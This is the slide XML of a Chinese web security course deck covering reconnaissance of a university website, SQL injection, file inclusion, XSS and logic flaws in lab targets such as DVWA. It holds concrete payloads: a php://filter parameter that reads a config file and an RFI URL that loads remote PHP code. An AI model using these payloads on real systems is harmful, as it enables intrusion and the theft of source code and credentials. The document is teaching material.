              <a:srgbClr val="43D0B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60400" y="1130300"/>
              <a:ext cx="10858500" cy="828000"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln>
              <a:headEnd type="none"/>
              <a:tailEnd type="none"/>
            </a:ln>
          </p:spPr>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="AutoShape 5"/>
          <p:cNvSpPr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1619250" y="1048089"/>
            <a:ext cx="8407400" cy="46736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0"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82275" y="223043"/>
            <a:ext cx="5537200" cy="355600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill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defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4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信息收集分类图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0" y="0"/>
            <a:ext cx="6172200" cy="269748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990600"/>
            <a:ext cx="6179820" cy="307086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2438400"/>
            <a:ext cx="6172200" cy="2895600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="2" name="ba87c558-77a2-4771-a219-52a8175e6186"/>
          <p:cNvGrpSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId4"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="660400" y="1316990"/>
            <a:ext cx="5118735" cy="4053795"/>
            <a:chOff x="660400" y="1317063"/>
            <a:chExt cx="8350250" cy="2725966"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="3" name="AutoShape 3"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2875141" y="1317063"/>
              <a:ext cx="6135509" cy="0"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="43D0B1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V="1">
              <a:off x="2676602" y="1317063"/>
              <a:ext cx="198539" cy="209225"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="43D0B1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816448" y="1527929"/>
              <a:ext cx="1860154" cy="0"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="43D0B1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60400" y="1449905"/>
              <a:ext cx="156048" cy="156048"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="43D0B1">
                <a:alpha val="100000"/>
              </a:srgbClr>
            </a:solidFill>
            <a:ln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660400" y="1792083"/>
              <a:ext cx="3943350" cy="1126011"/>
              <a:chOff x="660400" y="1792083"/>
              <a:chExt cx="3943350" cy="1126011"/>
            </a:xfrm>
          </p:grpSpPr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074753" y="2225920"/>
                <a:ext cx="2995773" cy="692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探测学校官网 `www.swust.edu.cn` 的真实服务器IP地址及网络路径。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074321" y="1792083"/>
                <a:ext cx="3529429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实验目标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60400" y="1792083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738424" y="2885441"/>
              <a:ext cx="3901431" cy="1132821"/>
              <a:chOff x="738424" y="2885441"/>
              <a:chExt cx="3901431" cy="1132821"/>
            </a:xfrm>
          </p:grpSpPr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921442" y="3319256"/>
                <a:ext cx="3123186" cy="6990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 `多地ping` 工具或服务，从不同地理位置对目标域名发起Ping请求，分析返回的IP地址。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110426" y="2885441"/>
                <a:ext cx="3529429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实验操作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38424" y="2885441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835525" y="1792083"/>
              <a:ext cx="3943605" cy="1157610"/>
              <a:chOff x="4835525" y="1792083"/>
              <a:chExt cx="3943605" cy="1157610"/>
            </a:xfrm>
          </p:grpSpPr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249878" y="2225920"/>
                <a:ext cx="3529252" cy="7237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成功获取目标服务器IP为 `220.166.52.238`，并可分析其网络路由节点。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249446" y="1792083"/>
                <a:ext cx="3529429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实验结果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35525" y="1792083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4835524" y="2948941"/>
              <a:ext cx="4019551" cy="1094088"/>
              <a:chOff x="4835524" y="2948941"/>
              <a:chExt cx="4019551" cy="1094088"/>
            </a:xfrm>
          </p:grpSpPr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5160792" y="3357687"/>
                <a:ext cx="3440166" cy="68534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验证了正面信息收集的基本流程，成功识别了目标的真实IP地址，为后续的网络层探测奠定了基础。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5325646" y="2948941"/>
                <a:ext cx="3529429" cy="4340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实验结论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835524" y="2974341"/>
                <a:ext cx="413922" cy="43401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实验结合</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="文本框 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="34432875" y="67494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9980255" y="10591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10910" y="3962400"/>
            <a:ext cx="6183630" cy="30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04560" y="5334000"/>
            <a:ext cx="618744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6853" y="1808184"/>
            <a:ext cx="9465596" cy="14843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SQL注入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356853" y="3304409"/>
            <a:ext cx="9465596" cy="156911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一种利用Web应用程序数据层漏洞的攻击技术，通过注入恶意SQL代码，操纵后端数据库，获取、篡改或删除数据。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0e60176-7c1b-4149-8a44-57be68f1c0b4"/>
          <p:cNvGrpSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId1"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="660399" y="1130300"/>
            <a:ext cx="10858500" cy="5003801"/>
            <a:chOff x="660399" y="1130300"/>
            <a:chExt cx="10858500" cy="5003801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1231177" y="2197102"/>
              <a:ext cx="7837423" cy="0"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="6350">
              <a:solidFill>
                <a:srgbClr val="43D0B1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60399" y="2616205"/>
              <a:ext cx="10858500" cy="3517896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43D0B1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 flipH="1">
              <a:off x="660399" y="1130300"/>
              <a:ext cx="10858500" cy="6476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SQL注入的原理、成因与分类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747173" y="2003252"/>
              <a:ext cx="2466520" cy="4050438"/>
              <a:chOff x="747173" y="2003252"/>
              <a:chExt cx="2466520" cy="4050438"/>
            </a:xfrm>
          </p:grpSpPr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843477" y="2003252"/>
                <a:ext cx="387700" cy="387700"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="43D0B1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47173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定义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49333" y="403836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在用户输入中插入恶意SQL代码，欺骗数据库服务器执行非授权的任意查询。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488881" y="2003252"/>
              <a:ext cx="2466520" cy="4056788"/>
              <a:chOff x="3488881" y="2003252"/>
              <a:chExt cx="2466520" cy="4056788"/>
            </a:xfrm>
          </p:grpSpPr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585185" y="2003252"/>
                <a:ext cx="387700" cy="387700"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="43D0B1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488881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核心原因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490406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应用程序未对用户输入数据进行有效过滤或转义，直接将其拼接到SQL查询语句中。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230589" y="2003252"/>
              <a:ext cx="2466520" cy="4056788"/>
              <a:chOff x="6230589" y="2003252"/>
              <a:chExt cx="2466520" cy="4056788"/>
            </a:xfrm>
          </p:grpSpPr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326893" y="2003252"/>
                <a:ext cx="387700" cy="387700"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="43D0B1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230589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分类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232114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主要分为数字型、字符型、联合查询注入、报错型注入、布尔盲注和时间盲注等。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972296" y="2003252"/>
              <a:ext cx="2466520" cy="4056788"/>
              <a:chOff x="8972296" y="2003252"/>
              <a:chExt cx="2466520" cy="4056788"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="19" name="TextBox 1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068600" y="2003252"/>
                <a:ext cx="387700" cy="387700"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="43D0B1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972296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通用步骤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8973821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通常包括判断注入点、确定注入类型、探测字段数、获取数据库信息（库名、表名、列名）和最终的数据。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知识点核心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b3469d9-11bd-4e5a-9cfb-afd48694cf83"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="660400" y="1130301"/>
            <a:ext cx="10858501" cy="3454672"/>
            <a:chOff x="660400" y="1130301"/>
            <a:chExt cx="10858501" cy="3454672"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="3" name="AutoShape 3"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="660400" y="1130301"/>
              <a:ext cx="10858501" cy="612000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3605530" y="2679427"/>
              <a:ext cx="4968240" cy="1905546"/>
              <a:chOff x="660400" y="1870549"/>
              <a:chExt cx="3554034" cy="1905546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2255270"/>
                <a:ext cx="3554034" cy="1520825"/>
              </a:xfrm>
              <a:prstGeom prst="roundRect">
                <a:avLst>
                  <a:gd name="adj" fmla="val 5385"/>
                </a:avLst>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="3E9EED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sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="TextBox 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strike="noStrike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SQL 注入分类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395785" y="685800"/>
            <a:ext cx="5400431" cy="54864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0"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cc176ec-2ed2-461c-80de-1ceab374a9ba"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="0" y="1130300"/>
            <a:ext cx="6151880" cy="5003800"/>
            <a:chOff x="0" y="1130301"/>
            <a:chExt cx="11531600" cy="5003799"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="3" name="AutoShape 3"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="0" y="1835072"/>
              <a:ext cx="10614452" cy="0"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="43D0B1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 flipV="1">
              <a:off x="10614452" y="1835072"/>
              <a:ext cx="147995" cy="154422"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="43D0B1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10762447" y="1989494"/>
              <a:ext cx="611725" cy="0"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="43D0B1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11376844" y="1912116"/>
              <a:ext cx="154756" cy="154756"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="43D0B1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399" y="1130301"/>
              <a:ext cx="10858500" cy="62487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使用靶场进行联合查询注入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60400" y="2146438"/>
              <a:ext cx="5338679" cy="1228309"/>
              <a:chOff x="660400" y="2146438"/>
              <a:chExt cx="5338679" cy="122830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074321" y="2545030"/>
                <a:ext cx="4924758" cy="8297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搭建sqli-labs或pikachu等靶场环境，选择基于GET请求的字符型注入点。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74321" y="2146438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实验环境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0400" y="214643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60400" y="3526115"/>
              <a:ext cx="5338679" cy="1228308"/>
              <a:chOff x="660400" y="3526115"/>
              <a:chExt cx="5338679" cy="1228308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074321" y="3924706"/>
                <a:ext cx="4924758" cy="8297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判断是否存在注入点和判断注入类型</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" sz="1100"/>
              </a:p>
              <a:p>
                <a:pPr algn="l">
                  <a:lnSpc>
                    <a:spcPct val="120000"/>
                  </a:lnSpc>
                </a:pPr>
                <a:r>
                  <a:rPr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分为：数字型、字符型（有引号但未正确闭合）、字符型（正确闭合）</a:t>
                </a:r>
                <a:endParaRPr sz="1200" b="0" i="0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74321" y="3526115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操作步骤一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60400" y="3526115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60400" y="4905791"/>
              <a:ext cx="5338680" cy="1228309"/>
              <a:chOff x="660400" y="4905791"/>
              <a:chExt cx="5338680" cy="122830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074321" y="5304383"/>
                <a:ext cx="4924758" cy="8297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判断列数，使用 order by 。</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" sz="1100"/>
              </a:p>
              <a:p>
                <a:pPr algn="l">
                  <a:lnSpc>
                    <a:spcPct val="120000"/>
                  </a:lnSpc>
                </a:pPr>
                <a:r>
                  <a:rPr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再union select确定后台的查询结果有几列</a:t>
                </a:r>
                <a:endParaRPr sz="1200" b="0" i="0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74322" y="4905791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操作步骤二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0400" y="4905791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180221" y="2146438"/>
              <a:ext cx="5338679" cy="1228309"/>
              <a:chOff x="6180221" y="2146438"/>
              <a:chExt cx="5338679" cy="1228309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594142" y="2545030"/>
                <a:ext cx="4924758" cy="8297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获取当前数据库名、数据表名、列名</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" sz="1100"/>
              </a:p>
              <a:p>
                <a:pPr algn="l">
                  <a:lnSpc>
                    <a:spcPct val="120000"/>
                  </a:lnSpc>
                </a:pPr>
                <a:r>
                  <a:rPr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最后获取数据</a:t>
                </a:r>
                <a:endParaRPr sz="1200" b="0" i="0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594142" y="2146438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操作步骤三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180221" y="214643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80221" y="3526115"/>
              <a:ext cx="5338679" cy="1228308"/>
              <a:chOff x="6180221" y="3526115"/>
              <a:chExt cx="5338679" cy="122830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6594142" y="3924706"/>
                <a:ext cx="4924758" cy="8297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完整复现了SQL注入的检测与利用流程，深入理解了联合查询注入获取数据的基本原理。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94142" y="3526115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实验结论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180221" y="3526115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实验结合</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="110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304800"/>
            <a:ext cx="5695950" cy="6162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6853" y="1808184"/>
            <a:ext cx="9465596" cy="14843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文件包含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356853" y="3304409"/>
            <a:ext cx="9465596" cy="156911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由于Web应用程序对文件路径参数过滤不严，导致攻击者可以包含并执行服务器本地或远程的任意文件。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356ab36-ad21-4b52-acc5-2f4f62c41ea5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId1"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="660399" y="1130302"/>
            <a:ext cx="10858500" cy="5003799"/>
            <a:chOff x="660399" y="1130302"/>
            <a:chExt cx="10858500" cy="5003799"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="4" name="TextBox 4"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="660399" y="1130302"/>
              <a:ext cx="10858500" cy="550188"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="43D0B1">
                <a:alpha val="94901"/>
                <a:lumMod val="75000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文件包含漏洞的定义、类型与利用条件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795679" y="2078276"/>
              <a:ext cx="2009625" cy="4055825"/>
              <a:chOff x="795679" y="2078276"/>
              <a:chExt cx="2009625" cy="4055825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03596" y="2078276"/>
                <a:ext cx="381600" cy="382702"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln w="12700">
                <a:solidFill>
                  <a:srgbClr val="43D0B1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95679" y="2550512"/>
                <a:ext cx="200962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定义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95679" y="3693161"/>
                <a:ext cx="200962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文件路径参数未校验，可被控制以包含任意文件，导致源码泄露或恶意代码执行。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942611" y="2078276"/>
              <a:ext cx="2009625" cy="4055825"/>
              <a:chOff x="2942611" y="2078276"/>
              <a:chExt cx="2009625" cy="4055825"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="10" name="TextBox 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050528" y="2078276"/>
                <a:ext cx="381600" cy="382702"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln w="12700">
                <a:solidFill>
                  <a:srgbClr val="43D0B1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942611" y="2550512"/>
                <a:ext cx="200962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本地文件包含(LFI)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942611" y="3693161"/>
                <a:ext cx="200962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读取Web服务器本地的敏感文件，如配置文件、日志文件等。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5089543" y="2078276"/>
              <a:ext cx="2009625" cy="4055825"/>
              <a:chOff x="5089543" y="2078276"/>
              <a:chExt cx="2009625" cy="4055825"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="14" name="TextBox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197460" y="2078276"/>
                <a:ext cx="381600" cy="382702"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln w="12700">
                <a:solidFill>
                  <a:srgbClr val="43D0B1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089543" y="2550512"/>
                <a:ext cx="200962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远程文件包含(RFI)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089543" y="3693161"/>
                <a:ext cx="200962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包含并执行远程攻击者控制的服务器上的恶意脚本文件，危害更大。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236475" y="2078276"/>
              <a:ext cx="2009625" cy="4055825"/>
              <a:chOff x="7236475" y="2078276"/>
              <a:chExt cx="2009625" cy="4055825"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="18" name="TextBox 1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344392" y="2078276"/>
                <a:ext cx="381600" cy="382702"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln w="12700">
                <a:solidFill>
                  <a:srgbClr val="43D0B1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236475" y="2550512"/>
                <a:ext cx="200962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利用条件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236475" y="3693161"/>
                <a:ext cx="200962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远程文件包含需要PHP配置项 `allow_url_include` 和 `allow_url_fopen` 同时开启。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383406" y="2078276"/>
              <a:ext cx="2009625" cy="4055825"/>
              <a:chOff x="9383406" y="2078276"/>
              <a:chExt cx="2009625" cy="4055825"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="22" name="TextBox 22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9491323" y="2078276"/>
                <a:ext cx="381600" cy="382702"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln w="12700">
                <a:solidFill>
                  <a:srgbClr val="43D0B1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9383406" y="2550512"/>
                <a:ext cx="200962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伪协议利用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9383406" y="3693161"/>
                <a:ext cx="200962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可利用 `php://filter` 等伪协议读取文件源码，或 `data://` 协议直接执行PHP代码。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知识点核心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9d25117-022e-4b8b-b44f-cfa6fac19df1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666750" y="2428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文件包含漏洞分类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428750" y="1771650"/>
            <a:ext cx="9334500" cy="33147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0"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59f3f96-f4e0-4c15-86d3-0e4762b54ae8"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="660400" y="1130300"/>
            <a:ext cx="9674860" cy="3691255"/>
            <a:chOff x="660400" y="1130300"/>
            <a:chExt cx="10871201" cy="4635500"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="3" name="AutoShape 3"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="660400" y="1778000"/>
              <a:ext cx="10858500" cy="3987800"/>
            </a:xfrm>
            <a:prstGeom prst="plaque">
              <a:avLst>
                <a:gd name="adj" fmla="val 1798"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="2F2F2F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3101" y="1130300"/>
              <a:ext cx="10858500" cy="5334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使用DVWA靶场进行文件包含漏洞利用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796424" y="1917898"/>
              <a:ext cx="5210676" cy="1760089"/>
              <a:chOff x="660400" y="1997977"/>
              <a:chExt cx="8027258" cy="271148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400" y="1997977"/>
                <a:ext cx="705300" cy="705299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ln w="19050">
                <a:solidFill>
                  <a:srgbClr val="43D0B1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395954" y="2031140"/>
                <a:ext cx="7291704" cy="6525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实验环境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95954" y="2683708"/>
                <a:ext cx="7291704" cy="20257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启动DVWA的文件包含模块，设置安全级别为低。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796424" y="3929511"/>
              <a:ext cx="5210676" cy="1760089"/>
              <a:chOff x="660400" y="1997977"/>
              <a:chExt cx="8027258" cy="271148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60400" y="1997977"/>
                <a:ext cx="705300" cy="705299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ln w="19050">
                <a:solidFill>
                  <a:srgbClr val="43D0B1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95954" y="2031140"/>
                <a:ext cx="7291704" cy="6525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LFI操作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95954" y="2683708"/>
                <a:ext cx="7291704" cy="20257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在包含文件参数后附加 `?page=php://filter/convert.base64-encode/resource=config.php`，成功读取并Base64解码出数据库配置文件源码。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117724" y="1917898"/>
              <a:ext cx="5210676" cy="1760089"/>
              <a:chOff x="660400" y="1997977"/>
              <a:chExt cx="8027258" cy="2711487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60400" y="1997977"/>
                <a:ext cx="705300" cy="705299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ln w="19050">
                <a:solidFill>
                  <a:srgbClr val="43D0B1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395954" y="2031140"/>
                <a:ext cx="7291704" cy="6525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RFI操作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95954" y="2683708"/>
                <a:ext cx="7291704" cy="20257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在本地搭建一个包含恶意PHP代码（如 `&lt;?php phpinfo(); ?&gt;`）的Web服务器，在靶场参数中输入 `?page=http://本地IP/shell.txt`，成功在靶场页面执行了远程代码。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117724" y="3929511"/>
              <a:ext cx="5210676" cy="1760089"/>
              <a:chOff x="660400" y="1997977"/>
              <a:chExt cx="8027258" cy="2711487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60400" y="1997977"/>
                <a:ext cx="705300" cy="705299"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst/>
                <a:ahLst/>
                <a:cxnLst/>
                <a:rect l="l" t="t" r="r" b="b"/>
                <a:pathLst>
                  <a:path w="636309" h="636309">
                    <a:moveTo>
                      <a:pt x="0" y="318154"/>
                    </a:moveTo>
                    <a:cubicBezTo>
                      <a:pt x="0" y="259584"/>
                      <a:pt x="23740" y="206558"/>
                      <a:pt x="62124" y="168175"/>
                    </a:cubicBezTo>
                    <a:lnTo>
                      <a:pt x="125467" y="125467"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="168175" y="62124"/>
                    </a:lnTo>
                    <a:cubicBezTo>
                      <a:pt x="206558" y="23740"/>
                      <a:pt x="259584" y="0"/>
                      <a:pt x="318154" y="0"/>
                    </a:cubicBezTo>
                    <a:cubicBezTo>
                      <a:pt x="376725" y="0"/>
                      <a:pt x="429750" y="23741"/>
                      <a:pt x="468133" y="62124"/>
                    </a:cubicBezTo>
                    <a:lnTo>
                      <a:pt x="510840" y="125466"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="574185" y="168175"/>
                    </a:lnTo>
                    <a:cubicBezTo>
                      <a:pt x="612569" y="206558"/>
                      <a:pt x="636309" y="259584"/>
                      <a:pt x="636309" y="318154"/>
                    </a:cubicBezTo>
                    <a:cubicBezTo>
                      <a:pt x="636309" y="376725"/>
                      <a:pt x="612569" y="429750"/>
                      <a:pt x="574185" y="468133"/>
                    </a:cubicBezTo>
                    <a:lnTo>
                      <a:pt x="510841" y="510841"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="468133" y="574185"/>
                    </a:lnTo>
                    <a:cubicBezTo>
                      <a:pt x="429750" y="612569"/>
                      <a:pt x="376725" y="636309"/>
                      <a:pt x="318154" y="636309"/>
                    </a:cubicBezTo>
                    <a:cubicBezTo>
                      <a:pt x="259584" y="636309"/>
                      <a:pt x="206558" y="612569"/>
                      <a:pt x="168175" y="574185"/>
                    </a:cubicBezTo>
                    <a:lnTo>
                      <a:pt x="125466" y="510840"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="62124" y="468133"/>
                    </a:lnTo>
                    <a:cubicBezTo>
                      <a:pt x="23740" y="429750"/>
                      <a:pt x="0" y="376725"/>
                      <a:pt x="0" y="318154"/>
                    </a:cubicBezTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:ln w="19050">
                <a:solidFill>
                  <a:srgbClr val="43D0B1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95954" y="2031140"/>
                <a:ext cx="7291704" cy="6525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实验结论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95954" y="2683708"/>
                <a:ext cx="7291704" cy="20257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验证了文件包含漏洞的两种主要利用方式，理解了伪协议在漏洞利用中的巧妙应用，并认识到危险配置项的巨大风险。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实验结合</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="110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4953000"/>
            <a:ext cx="10401300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6853" y="1808184"/>
            <a:ext cx="9465596" cy="14843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XSS漏洞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356853" y="3304409"/>
            <a:ext cx="9465596" cy="156911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跨站脚本攻击，指攻击者将恶意脚本（通常为JavaScript）注入到网页中，当其他用户浏览该页面时，脚本会在其浏览器中执行。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5ecf981-a2f3-4864-871c-024729b18819"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="660400" y="1130301"/>
            <a:ext cx="10858500" cy="5397499"/>
            <a:chOff x="660400" y="1130301"/>
            <a:chExt cx="10858500" cy="5397499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1"/>
              <a:ext cx="10858500" cy="56629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XSS漏洞的原理、类型与攻击流程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2069065"/>
              <a:ext cx="2035235" cy="4458735"/>
              <a:chOff x="660400" y="2069065"/>
              <a:chExt cx="2035235" cy="4458735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2307159"/>
                <a:ext cx="203523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18762" y="3303147"/>
                <a:ext cx="1918509" cy="31230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注入恶意客户端脚本（如JavaScript）到网页中，实现对用户浏览器的攻击。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18762" y="2566988"/>
                <a:ext cx="1918509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定义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3140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43D0B1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866216" y="2069065"/>
              <a:ext cx="2035235" cy="4458735"/>
              <a:chOff x="2866216" y="2069065"/>
              <a:chExt cx="2035235" cy="4458735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2866216" y="2307159"/>
                <a:ext cx="203523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924578" y="3303147"/>
                <a:ext cx="1918509" cy="31230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攻击者构造恶意输入 → Web应用未过滤直接输出 → 用户访问恶意页面 → 恶意脚本在用户浏览器中执行。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924578" y="2566988"/>
                <a:ext cx="1918509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攻击流程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03517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43D0B1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072032" y="2069065"/>
              <a:ext cx="2035235" cy="4458735"/>
              <a:chOff x="5072032" y="2069065"/>
              <a:chExt cx="2035235" cy="4458735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5072032" y="2307159"/>
                <a:ext cx="203523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130394" y="3303147"/>
                <a:ext cx="1918509" cy="31230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恶意脚本来自当前HTTP请求的参数，一次性触发，通常需要诱导用户点击链接。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130394" y="2566988"/>
                <a:ext cx="1918509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反射型XSS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23894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43D0B1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277849" y="2069065"/>
              <a:ext cx="2035235" cy="4458735"/>
              <a:chOff x="7277849" y="2069065"/>
              <a:chExt cx="2035235" cy="4458735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7277849" y="2307159"/>
                <a:ext cx="203523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6211" y="3303147"/>
                <a:ext cx="1918509" cy="31230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恶意脚本被永久存储在目标服务器的数据库中，所有访问该页面的用户都会触发，危害持久。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36211" y="2566988"/>
                <a:ext cx="1918509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存储型XSS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442719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43D0B1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9483665" y="2069065"/>
              <a:ext cx="2035235" cy="4458735"/>
              <a:chOff x="9483665" y="2069065"/>
              <a:chExt cx="2035235" cy="4458735"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="25" name="AutoShape 25"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="9483665" y="2307159"/>
                <a:ext cx="2035235" cy="4220641"/>
              </a:xfrm>
              <a:prstGeom prst="roundRect">
                <a:avLst>
                  <a:gd name="adj" fmla="val 4000"/>
                </a:avLst>
              </a:prstGeom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542027" y="3303147"/>
                <a:ext cx="1918509" cy="31230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漏洞存在于前端JavaScript代码中，通过修改页面的DOM结构来触发，不与服务器进行数据交互。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542027" y="2566988"/>
                <a:ext cx="1918509" cy="7361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DOM型XSS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646488" y="2069065"/>
                <a:ext cx="504000" cy="502767"/>
              </a:xfrm>
              <a:prstGeom prst="roundRect">
                <a:avLst>
                  <a:gd name="adj" fmla="val 10458"/>
                </a:avLst>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="43D0B1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知识点核心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知识点核心</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="110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1905000"/>
            <a:ext cx="6017260" cy="33020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05000"/>
            <a:ext cx="624205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6853" y="1808184"/>
            <a:ext cx="9465596" cy="14843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逻辑漏洞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356853" y="3304409"/>
            <a:ext cx="9465596" cy="156911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业务流程或权限校验设计存在缺陷，导致攻击者可以绕过正常逻辑，实现非预期的操作，如越权访问。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517a4de-eb98-4a2b-b31e-7996d4bd12a3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593725"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="43D0B1">
                <a:alpha val="100000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逻辑漏洞与越权问题的定义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727656" y="1925223"/>
              <a:ext cx="2596954" cy="4208877"/>
              <a:chOff x="727656" y="1925223"/>
              <a:chExt cx="2596954" cy="4208877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727658" y="3635604"/>
                <a:ext cx="2596952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业务流程或权限校验设计错误，导致非预期操作，是应用层逻辑缺陷的体现。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7656" y="2617258"/>
                <a:ext cx="259694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定义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27657" y="1925223"/>
                <a:ext cx="259694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40901" y="1925223"/>
              <a:ext cx="2596954" cy="4053937"/>
              <a:chOff x="3440901" y="1925223"/>
